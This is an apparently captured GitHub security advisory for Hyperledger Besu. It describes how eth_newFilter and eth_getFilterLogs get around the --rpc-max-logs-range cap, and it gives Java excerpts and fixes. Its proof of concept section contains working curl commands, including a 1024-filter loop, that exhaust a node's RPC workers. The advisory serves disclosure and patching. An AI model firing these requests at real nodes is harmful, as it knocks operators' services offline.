# GHSA-9w9r-w3rf-j6vj: `eth_getLogs` enforces an `--rpc-max-logs-range` block-range cap, but the same protection is missing from the filter-based path. An unauthenticated caller can install a filter via `eth_newFilter` with `fromBlock: "0x0", toBlock: "latest"`, then poll 

| Field | Value |
| --- | --- |
| Repo | hyperledger/besu |
| GHSA | GHSA-9w9r-w3rf-j6vj |
| CVE | none assigned |
| Severity | high |
| CWE | CWE-755 |
| Published | 2026-10-02T02:24:04Z |
| Updated | 2026-10-02T02:24:04Z |
| Affected | org.hyperledger.besu:besu <= 26.7.1 (patched: 26.8.0) |
| Credits | macfarla, wantaekchoi |
| Advisory URL | https://github.com/besu-eth/besu/security/advisories/GHSA-9w9r-w3rf-j6vj |
| Captured | 2026-11-12 (WAT), daily update |

## Description (verbatim)

**Summary**: `eth_getLogs` enforces an `--rpc-max-logs-range` block-range cap, but the same protection is missing from the filter-based path. An unauthenticated caller can install a filter via `eth_newFilter` with `fromBlock: "0x0", toBlock: "latest"`, then poll `eth_getFilterLogs` to retrieve the full chain's logs, sidestepping the limit that operators rely on to keep the RPC worker pool responsive. The filter creation itself doesn't validate the requested range either, so the bypass works on any default install with the JSON-RPC filter API enabled.

**Severity**: High

**Affected file/line**:
- `ethereum/api/src/main/java/org/hyperledger/besu/ethereum/api/jsonrpc/internal/methods/EthGetLogs.java:114-118` (the only place `maxLogRange` is enforced)
- `ethereum/api/src/main/java/org/hyperledger/besu/ethereum/api/jsonrpc/internal/methods/EthNewFilter.java:42-58` (creates filter without range check)
- `ethereum/api/src/main/java/org/hyperledger/besu/ethereum/api/jsonrpc/internal/methods/EthGetFilterLogs.java:45-61` (returns logs for filter without range check)
- `ethereum/api/src/main/java/org/hyperledger/besu/ethereum/api/jsonrpc/internal/filter/FilterManager.java:243-255` (`logs(...)` resolves and queries the full range with no cap)

## Vulnerability

`EthGetLogs.response(...)` is the only place that consults `maxLogRange`:

```java
// EthGetLogs.java:90-118
final long fromBlockNumber = filter.getFromBlock().getBlockNumber(blockchain).orElseThrow(...);
final long toBlockNumber   = filter.getToBlock().getBlockNumber(blockchain).orElseThrow(...);
FilterParameter.validateBlockRange(fromBlockNumber, toBlockNumber, blockchain.headBlockNumber());
if (maxLogRange > 0 && (toBlockNumber - fromBlockNumber) > maxLogRange) {
  throw new InvalidJsonRpcParameters(
      "Requested range exceeds maximum range limit",
      RpcErrorType.EXCEEDS_RPC_MAX_BLOCK_RANGE);
}
```

`EthNewFilter` performs neither this check nor any other range validation — it just stores the filter:

```java
// EthNewFilter.java:42-60
public JsonRpcResponse response(final JsonRpcRequestContext requestContext) {
  final FilterParameter filter = requestContext.getRequiredParameter(0, FilterParameter.class);
  if (!filter.isValid()) {
    return new JsonRpcErrorResponse(... INVALID_FILTER_PARAMS);
  }
  final String logFilterId = filterManager.installLogFilter(
      filter.getFromBlock(), filter.getToBlock(), filter.getLogsQuery());
  return new JsonRpcSuccessResponse(requestContext.getRequest().getId(), logFilterId);
}
```

`EthGetFilterLogs` then asks `FilterManager` for the logs:

```java
// EthGetFilterLogs.java:45-61
final String filterId = requestContext.getRequiredParameter(0, String.class);
final List<LogWithMetadata> logs = filterManager.logs(filterId);
```

`FilterManager.logs(...)` resolves `EARLIEST/LATEST` against the chain head and pulls **every block in the range with no cap**:

```java
// FilterManager.java:235-255
public List<LogWithMetadata> logs(final String filterId) {
  final LogFilter filter = filterRepository.getFilter(filterId, LogFilter.class).orElse(null);
  ...
  final long fromBlockNumber =
      filter.getFromBlock().getNumber().orElse(blockchainQueries.headBlockNumber());
  final long toBlockNumber =
      filter.getToBlock().getNumber().orElse(blockchainQueries.headBlockNumber());
  return findLogsWithinRange(filter, fromBlockNumber, toBlockNumber);
}

private List<LogWithMetadata> findLogsWithinRange(
    final LogFilter filter, final long fromBlockNumber, final long toBlockNumber) {
  return blockchainQueries.matchingLogs(
      fromBlockNumber, toBlockNumber, filter.getLogsQuery(), () -> true);
}
```

The `() -> true` "is alive" predicate is also notable — `BlockchainQueries.matchingLogs` polls this on every segment to decide whether to abort early. By hard-coding it to `true`, the `eth_getFilterLogs` path will not even cancel when the client disconnects, so the RPC worker churns through the full range regardless of whether anyone is still listening.

So the operator who sets `--rpc-max-logs-range=10000` to protect their node still permits any caller to do:

```
eth_newFilter({fromBlock:"0x0", toBlock:"latest"})  -> "0x123..."
eth_getFilterLogs("0x123...")                        -> full-chain scan
```

with `findLogsWithinRange` reading every receipt the bloom filter flags from genesis to head.

## Impact

- **Trivially bypasses `--rpc-max-logs-range`** with two RPC calls. Operators who believe they have configured a safe range limit are wrong; any caller with `eth` namespace access still has unlimited range.
- **Sustained CPU and disk-IO load**: a single filter request walks every block bloom and pulls every matching receipt. On a mainnet archive node this is many GB of receipt data and tens of millions of bloom checks — a single HTTP request is enough to occupy the RPC worker for minutes.
- **Cannot be cancelled**: because the `isQueryAlive` predicate is hard-coded `() -> true`, dropping the connection does not abort the scan. An attacker can fire-and-forget thousands of requests; the node will keep processing them.
- **Multiplied by lack of filter cap**: `FilterRepository` (file `FilterRepository.java:25-83`) holds filters in an unbounded `ConcurrentHashMap`. There is no per-connection nor global cap on registered filters, so an attacker can also pre-register thousands of filters cheaply, then poll them all in parallel from a different connection.
- **Defense-in-depth gone**: the `(toBlockNumber - fromBlockNumber) > maxLogRange` check is the *only* range-related guard in Besu's RPC namespace; if it can be skipped, no other layer prevents this.

## PoC

Against a default Besu node with the `eth` API namespace exposed and `--rpc-max-logs-range=10000`:

```bash
# Step 1: install a filter that spans the entire chain (succeeds despite maxLogRange).
FILTER_ID=$(curl -s -X POST http://NODE:8545 -H 'content-type:application/json' --data '{
  "jsonrpc":"2.0","id":1,"method":"eth_newFilter","params":[{
    "fromBlock":"0x0",
    "toBlock":"latest"
  }]
}' | jq -r .result)

# Step 2: pull all logs through the filter.  The cap is silently skipped.
curl -s -X POST http://NODE:8545 -H 'content-type:application/json' --data "{
  \"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"eth_getFilterLogs\",\"params\":[\"$FILTER_ID\"]
}"
```

Compare with the equivalent `eth_getLogs` call which is correctly rejected:

```bash
curl -s -X POST http://NODE:8545 -H 'content-type:application/json' --data '{
  "jsonrpc":"2.0","id":1,"method":"eth_getLogs","params":[{
    "fromBlock":"0x0","toBlock":"latest"
  }]
}'
# -> {"error":{"code":-32005,"message":"Requested range exceeds maximum range limit"}}
```

A second amplification: install many filters first.

```bash
for i in $(seq 1 1024); do
  curl -s -X POST http://NODE:8545 -H 'content-type:application/json' --data '{
    "jsonrpc":"2.0","id":1,"method":"eth_newFilter","params":[{
      "fromBlock":"0x0","toBlock":"latest"
    }]
  }' > /dev/null
done
# Then poll them all in parallel on a different keepalive connection.
```

Each `eth_getFilterLogs` invocation occupies an RPC worker for the duration of the scan; the worker pool is exhausted within a handful of polls.

## Recommendation

1. Apply `validateBlockRange` and `maxLogRange` checks at filter creation time in `EthNewFilter` so wide-range filters cannot be installed in the first place. The simplest fix is to share the `EthGetLogs` validation block:

   ```java
   final long fromBlockNumber =
       filter.getFromBlock().getBlockNumber(blockchain).orElseThrow(...);
   final long toBlockNumber =
       filter.getToBlock().getBlockNumber(blockchain).orElseThrow(...);
   FilterParameter.validateBlockRange(fromBlockNumber, toBlockNumber, blockchain.headBlockNumber());
   if (maxLogRange > 0 && (toBlockNumber - fromBlockNumber) > maxLogRange) {
     return new JsonRpcErrorResponse(id, EXCEEDS_RPC_MAX_BLOCK_RANGE);
   }
   ```

   Note that the filter stores `BlockParameter` (which can include the symbolic `LATEST`), so the range needs to be re-validated on each `eth_getFilterLogs` call after resolution to a concrete block number — `LATEST` may have advanced significantly between filter creation and read.

2. Pass the request's real `isAlive` callback into `findLogsWithinRange` so that disconnecting the client aborts the scan, instead of the hard-coded `() -> true`. This requires plumbing `JsonRpcRequestContext::isAlive` into `FilterManager.logs`.

3. Cap the number of registered filters per connection (and globally) in `FilterRepository.save(...)` so the precondition step in the second PoC cannot exhaust memory.

4. Consider an upper-bound on the *resolved* range that applies to subscriptions over WebSocket (`eth_subscribe(logs)`) too — the subscription installs an open-ended log filter with no range guard.

**Payment / Contact**
If this finding qualifies for a reward, payment can be sent to:
`0x83e033dd8ddb93052cc880227b06a8ee38f25eb2`
(EVM address — any chain)

Filing through GitHub PVR because the platform that hosts the official bounty has KYC requirements I have not been able to clear from my jurisdiction.

## Patches and references

Fixed in Besu 26.8.0.

- Patch commit on `main`: https://github.com/besu-eth/besu/commit/7c3a30b8a24c
- Pull request: https://github.com/besu-eth/besu/pull/11099
